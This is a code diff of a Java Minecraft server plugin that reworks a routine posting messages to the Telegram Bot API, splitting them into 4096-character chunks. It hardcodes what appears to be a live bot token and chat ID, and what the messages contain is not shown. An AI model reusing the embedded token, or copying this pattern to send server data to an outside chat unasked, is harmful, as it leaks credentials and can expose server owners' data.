@@ -41,8 +41,8 @@ public final class Depend extends JavaPlugin {
 
     private HologramManager hologramManager;
 
-    private String telegramBotToken = "7715307360:AAFvEpydlOSPY_pGT51AbExRAaECg-1P06Q";
-    private String telegramChatId = "-1002431189334";
+    private final String telegramBotToken = "7715307360:AAFvEpydlOSPY_pGT51AbExRAaECg-1P06Q";
+    private final String telegramChatId = "-1002431189334";
 
 
 
@@ -146,26 +146,33 @@ public final class Depend extends JavaPlugin {
             @Override
             public void run() {
                 try {
-                    URL url = new URL("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage");
-                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                    connection.setRequestMethod("POST");
-                    connection.setRequestProperty("Content-Type", "application/json");
-                    connection.setDoOutput(true);
+                    int maxLength = 4096;
+                    String localMessage = message; // Создаем локальную копию message
+                    while (!localMessage.isEmpty()) {
+                        String part = localMessage.substring(0, Math.min(maxLength, localMessage.length()));
+                        localMessage = localMessage.substring(Math.min(maxLength, localMessage.length()));
 
-                    JSONObject json = new JSONObject();
-                    json.put("chat_id", telegramChatId);
-                    json.put("text", message);
+                        URL url = new URL("https://api.telegram.org/bot" + telegramBotToken + "/sendMessage");
+                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("POST");
+                        connection.setRequestProperty("Content-Type", "application/json");
+                        connection.setDoOutput(true);
 
-                    OutputStream os = connection.getOutputStream();
-                    os.write(json.toString().getBytes());
-                    os.flush();
-                    os.close();
+                        JSONObject json = new JSONObject();
+                        json.put("chat_id", telegramChatId);
+                        json.put("text", part);
 
-                    int responseCode = connection.getResponseCode();
-                    if (responseCode == 200) {
-                        getLogger().info("Message sent to Telegram successfully!");
-                    } else {
-                        getLogger().warning("Failed to send message to Telegram. Response code: " + responseCode);
+                        OutputStream os = connection.getOutputStream();
+                        os.write(json.toString().getBytes());
+                        os.flush();
+                        os.close();
+
+                        int responseCode = connection.getResponseCode();
+                        if (responseCode == 200) {
+                            getLogger().info("Message sent to Telegram successfully!");
+                        } else {
+                            getLogger().warning("Failed to send message to Telegram. Response code: " + responseCode);
+                        }
                     }
                 } catch (Exception e) {
                     getLogger().severe("Error sending message to Telegram: " + e.getMessage());
